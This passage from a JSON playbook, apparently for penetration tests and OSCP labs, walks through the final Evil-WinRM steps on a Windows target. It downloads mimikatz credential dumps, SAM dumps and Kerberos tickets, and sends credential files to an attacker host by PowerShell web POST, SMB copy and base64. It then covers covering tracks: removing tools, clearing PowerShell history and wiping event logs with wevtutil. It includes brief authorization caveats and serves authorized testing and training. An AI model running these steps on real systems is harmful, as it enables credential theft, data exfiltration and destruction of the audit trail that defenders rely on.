      "id": "download-results",
      "name": "Download Results and Evidence",
      "objective": "Exfiltrate all collected data, credentials, and flags for offline analysis and writeup documentation",
      "description": "Use Evil-WinRM's built-in download functionality to exfiltrate collected data back to attacker system.\n\nEvil-WinRM Download Syntax:\n```\ndownload <remote_path> <local_path>\n```\n\nExample: Download credentials\n```\ndownload C:\\temp\\credentials.txt /tmp/creds.txt\n```\n\nExpected Output (Success):\n```\nInfo: Downloading C:\\temp\\credentials.txt to /tmp/creds.txt\n\nData: 51200 bytes of 51200 bytes copied\n\nInfo: Download successful!\n```\n\nBatch Download:\n```\n# Download all collected files:\ndownload C:\\temp\\credentials.txt /tmp/credentials.txt\ndownload C:\\temp\\sam.txt /tmp/sam.txt\ndownload C:\\temp\\domain_admins.txt /tmp/domain_admins.txt\ndownload C:\\temp\\privesc.txt /tmp/privesc.txt\ndownload C:\\temp\\network.txt /tmp/network.txt\n```\n\nDownload Kerberos Tickets:\n```powershell\n# First, list ticket files:\ndir C:\\temp\\*.kirbi\n```\n\nThen download each:\n```\ndownload C:\\temp\\ticket1.kirbi /tmp/ticket1.kirbi\ndownload C:\\temp\\ticket2.kirbi /tmp/ticket2.kirbi\n```\n\nCompress Before Download (for large results):\n```powershell\n# On target:\nCompress-Archive -Path C:\\temp\\*.txt -DestinationPath C:\\temp\\results.zip\n```\n\nThen download:\n```\ndownload C:\\temp\\results.zip /tmp/results.zip\n```\n\nOn attacker:\n```bash\nunzip /tmp/results.zip -d /tmp/results/\n```\n\nPriority Download Order:\n\n1. Credentials (Highest Priority):\n   - credentials.txt (mimikatz output)\n   - sam.txt (SAM dump)\n   - secrets.txt (LSA secrets)\n   - *.kirbi (Kerberos tickets)\n\n2. Flags:\n   - user.txt\n   - proof.txt / root.txt\n\n3. Enumeration:\n   - domain_admins.txt\n   - domain_users.txt\n   - privesc.txt (PowerUp output)\n   - processes.txt\n   - network.txt\n\n4. Evidence:\n   - systeminfo.txt\n   - whoami_all.txt\n   - screenshots (if taken)\n\nVerify Downloads:\n\nOn attacker system:\n```bash\n# Check file exists:\nls -lh /tmp/credentials.txt\n\n# Verify not empty:\nwc -l /tmp/credentials.txt\n\n# Preview contents:\nhead -20 /tmp/credentials.txt\n```\n\nAlternative Download Methods:\n\n1. PowerShell Web Upload:\n```powershell\n# On target:\nInvoke-WebRequest -Uri http://<ATTACKER_IP>/upload -Method POST -InFile C:\\temp\\credentials.txt\n```\n\nRequires: Web server on attacker that accepts POST uploads\n\n2. SMB Copy:\n```powershell\n# On target:\ncopy C:\\temp\\credentials.txt \\\\<ATTACKER_IP>\\share\\\n```\n\nRequires: SMB server on attacker\n\n3. Base64 Exfiltration (small files):\n```powershell\n# On target:\n[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"C:\\temp\\credentials.txt\"))\n```\n\nCopy output, decode on attacker:\n```bash\necho \"<BASE64_STRING>\" | base64 -d > credentials.txt\n```\n\n4. DNS Exfiltration (stealth):\nFor sensitive environments with egress filtering.\n\nDocumentation Package:\n\nCreate organized directory structure:\n```bash\nmkdir -p /tmp/CLIENT75_evidence/{credentials,enumeration,flags,screenshots}\n\n# Download to organized locations:\ndownload C:\\temp\\credentials.txt /tmp/CLIENT75_evidence/credentials/\ndownload C:\\temp\\domain_admins.txt /tmp/CLIENT75_evidence/enumeration/\ndownload C:\\temp\\user.txt /tmp/CLIENT75_evidence/flags/\n```\n\nCreate evidence manifest:\n```bash\ncat > /tmp/CLIENT75_evidence/MANIFEST.txt << EOF\n=== EVIDENCE MANIFEST ===\nTarget: CLIENT75.CORP.LOCAL (10.10.10.75)\nUser: CORP\\mike\nDate: $(date)\n\nFiles Collected:\n- credentials.txt: Mimikatz credential dump (51KB)\n- sam.txt: SAM database dump (12KB)\n- domain_admins.txt: Domain Admin list (1KB)\n- user.txt: User flag\n- systeminfo.txt: System information (5KB)\n\nKey Findings:\n- Domain Admin credentials extracted: CORP\\administrator\n- User flag: <flag_contents>\n- Service sessions: administrator, svc_backup\nEOF\n```\n\nCleanup Tracking:\n\nBefore downloading, document what to clean:\n```powershell\n# On target, create cleanup list:\ndir C:\\temp | Out-File C:\\temp\\cleanup_list.txt\n```\n\nDownload cleanup list:\n```\ndownload C:\\temp\\cleanup_list.txt /tmp/cleanup_list.txt\n```\n\nTroubleshooting:\n\n1. Download Fails:\n   - Check file exists: dir C:\\temp\\credentials.txt\n   - Check permissions: Try different location\n   - Use alternative method: SMB, PowerShell upload\n\n2. File Too Large:\n   - Compress first: Compress-Archive\n   - Download in chunks (not supported by evil-winrm)\n   - Use alternative: SMB copy\n\n3. Incomplete Download:\n   - Network interruption\n   - Re-download and verify size\n   - Check file integrity on both sides\n\n4. Permission Denied:\n   - File locked by process\n   - Close applications: Stop-Process\n   - Copy to temp location first",
      "command_ref": "evil-winrm-download-file",
      "evidence": [
        "All files downloaded successfully",
        "File sizes match source files",
        "Credentials extracted and verified",
        "Flags downloaded (if applicable)",
        "Evidence organized in directory structure"
      ],
      "dependencies": ["execute-operations"],
      "repeatable": true,
      "success_criteria": [
        "All result files downloaded",
        "File sizes correct (not truncated)",
        "Files readable and not corrupted",
        "Evidence organized for writeup",
        "Cleanup list created"
      ],
      "failure_conditions": [
        "Download fails: Check file exists and permissions",
        "File corrupted: Re-download and verify size",
        "Files too large: Compress before download"
      ],
      "next_steps": ["session-cleanup"]
    },
    {
      "id": "session-cleanup",
      "name": "Session Cleanup and Exit",
      "objective": "Optionally clean up artifacts and properly close Evil-WinRM session",
      "description": "Clean up uploaded tools and output files (optional for stealth), then properly exit Evil-WinRM session.\n\nCleanup Options:\n\nOption 1: Full Cleanup (Stealth)\n```powershell\n# Remove uploaded tools:\nRemove-Item C:\\temp\\mimikatz.exe\nRemove-Item C:\\temp\\*.ps1\n\n# Remove output files:\nRemove-Item C:\\temp\\credentials.txt\nRemove-Item C:\\temp\\*.txt\nRemove-Item C:\\temp\\*.kirbi\n\n# Remove directory (if created):\nRemove-Item C:\\temp -Recurse -Force\n```\n\nOption 2: Partial Cleanup (Keep evidence):\n```powershell\n# Remove only tools:\nRemove-Item C:\\temp\\mimikatz.exe\nRemove-Item C:\\temp\\*.ps1\n\n# Keep output files for further analysis\n```\n\nOption 3: No Cleanup (Labs/CTF):\n```\n# Leave everything for writeup documentation\n# Common in OSCP labs where stealth not required\n```\n\nVerify Cleanup:\n```powershell\n# Check directory empty:\ndir C:\\temp\n\n# Check no artifacts in common locations:\ndir C:\\Users\\Public\ndir $env:TEMP\n```\n\nExpected (Full Cleanup):\n```\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n\n(empty)\n```\n\nClear PowerShell History:\n```powershell\nClear-History\nRemove-Item (Get-PSReadlineOption).HistorySavePath\n```\n\nClear Windows Event Logs (Optional, noisy):\n```powershell\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n```\n\nNote: This is VERY noisy and will trigger alerts. Only do if explicitly required.\n\nProper Session Exit:\n\n1. Exit Evil-WinRM:\n```\nexit\n```\n\nExpected:\n```\nInfo: Exiting with code 0\n```\n\n2. Verify Disconnected:\n   - Evil-WinRM prompt disappears\n   - Returns to attacker shell\n   - No error messages\n\nAlternative Exit:\n```\nCtrl+D\n```\n\nOR\n```\nCtrl+C (then confirm)\n```\n\nPost-Session Verification:\n\nOn attacker system:\n```bash\n# Verify all files downloaded:\nls -lh /tmp/CLIENT75_evidence/\n\n# Verify files not empty:\nfind /tmp/CLIENT75_evidence/ -type f -size 0\n\n# Preview key files:\nhead /tmp/CLIENT75_evidence/credentials/credentials.txt\ncat /tmp/CLIENT75_evidence/flags/user.txt\n```\n\nSession Documentation:\n\nCreate session log:\n```bash\ncat > /tmp/CLIENT75_evidence/SESSION_LOG.md << EOF\n# Evil-WinRM Session Log\n\n## Connection Details\n- Target: CLIENT75.CORP.LOCAL (10.10.10.75)\n- User: CORP\\mike\n- Method: Password authentication\n- Start Time: $(date)\n- Duration: 15 minutes\n\n## Actions Performed\n1. Verified environment (whoami, hostname, privileges)\n2. Created C:\\temp directory\n3. Uploaded mimikatz.exe (1.2 MB)\n4. Executed privilege::debug + sekurlsa::logonpasswords\n5. Downloaded credentials.txt (51 KB)\n6. Retrieved user flag\n7. Cleaned up artifacts\n8. Exited session\n\n## Key Findings\n- Local admin confirmed: Yes\n- Credentials extracted: 5 user accounts\n- Domain Admin found: CORP\\administrator\n- User flag: <flag_contents>\n\n## Files Downloaded\n- credentials.txt (mimikatz output)\n- user.txt (flag)\n- domain_admins.txt (DA list)\n- systeminfo.txt (system info)\n\n## Cleanup Status\n- Tools removed: Yes\n- Output files removed: Yes\n- History cleared: Yes\nEOF\n```\n\nCleanup Considerations:\n\nOSCP Labs:\n- Cleanup usually NOT required (lab environment)\n- Focus on documentation and learning\n- Leaving artifacts helps with debugging\n\nReal Engagements:\n- Cleanup depends on scope and requirements\n- Stealth operations: Full cleanup required\n- Red team: May leave for blue team detection training\n- Penetration test: Discuss with client\n\nLegal/Ethical:\n- ONLY perform cleanup if authorized\n- Document all actions (even cleanup)\n- Don't clear logs without explicit permission\n- Maintain chain of custody for evidence\n\nTroubleshooting:\n\n1. Can't Remove Files:\n   - File locked by process: Stop-Process\n   - Permission denied: May need SYSTEM shell\n   - File in use: Close applications first\n\n2. History Not Clearing:\n   - PowerShell history location varies\n   - Check: (Get-PSReadlineOption).HistorySavePath\n   - Manual deletion: Remove-Item <path>\n\n3. Session Won't Exit:\n   - Try Ctrl+C or Ctrl+D\n   - Force close terminal\n   - Verify no background jobs: Get-Job\n\n4. Artifacts Remaining:\n   - Check all upload locations\n   - Check temp directories: $env:TEMP\n   - Search for tools: Get-ChildItem -Recurse -Include mimikatz.exe\n\nFinal Verification:\n\nBefore closing session, verify:\n- ✓ All evidence downloaded\n- ✓ Files verified (not corrupted)\n- ✓ Flags captured (if applicable)\n- ✓ Credentials extracted and tested\n- ✓ Documentation complete\n- ✓ Cleanup performed (if required)\n- ✓ Session properly closed\n\nExit session:\n```\nexit\n```\n\nEnd of Evil-WinRM operational workflow.",
      "command_ref": null,
      "evidence": [
        "Cleanup completed (if performed)",
        "Session exited properly (no errors)",
        "All evidence preserved on attacker system",
        "Session log created",
        "Documentation complete"
      ],
      "dependencies": ["download-results"],
      "repeatable": true,
      "success_criteria": [
        "All evidence downloaded before cleanup",
        "Cleanup performed as required",
        "Session exited cleanly",
        "No artifacts left (if stealth required)",
        "Documentation complete"
      ],
      "failure_conditions": [
        "Files not fully downloaded: Re-download before cleanup",
        "Can't remove files: Files may be locked, stop processes",
        "Session hangs: Force close with Ctrl+C"
      ],
      "next_steps": []
    }
  ]
}
